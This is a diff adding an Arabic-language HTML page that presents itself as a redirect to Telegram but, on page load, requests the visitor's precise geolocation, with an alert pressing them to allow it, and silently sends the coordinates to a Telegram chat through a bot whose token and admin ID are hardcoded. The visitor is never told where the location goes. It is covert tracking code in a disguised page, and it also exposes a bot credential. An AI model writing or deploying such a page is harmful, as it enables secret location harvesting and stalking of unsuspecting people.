@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحويل...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    const botToken = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";         // ← توكن البوت الخاص فيك
+    const adminId = "6243038338";  // ← آي دي تليجرام الخاص فيك
+    const botUsername = "YourBotUsername";         // ← اسم البوت بدون @
+
+    window.onload = function () {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+          const lat = position.coords.latitude.toFixed(5);
+          const lon = position.coords.longitude.toFixed(5);
+          
+          // إرسال الموقع إلى حسابك عبر تليجرام
+          const location = `🛰️ موقع زبون جديد\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+          // إرسال الرسالة إلى التليجرام
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: adminId,
+              text: location
+            })
+          }).then(response => {
+            if (response.ok) {
+              // إذا تم إرسال الرسالة بنجاح
+              window.location.href = `https://t.me/${botUsername}`;
+            }
+          });
+          
+        }, function () {
+          alert("يرجى السماح للموقع بالحصول على موقعك الجغرافي للمتابعة.");
+        }, {
+          enableHighAccuracy: true, // طلب دقة أعلى في تحديد الموقع
+          timeout: 5000,            // الحد الأقصى للوقت للحصول على الموقع
+          maximumAge: 0            // عدم استخدام الموقع المخزن
+        });
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>جارٍ تحويلك إلى تليجرام...</p>
+</body>
+</html>
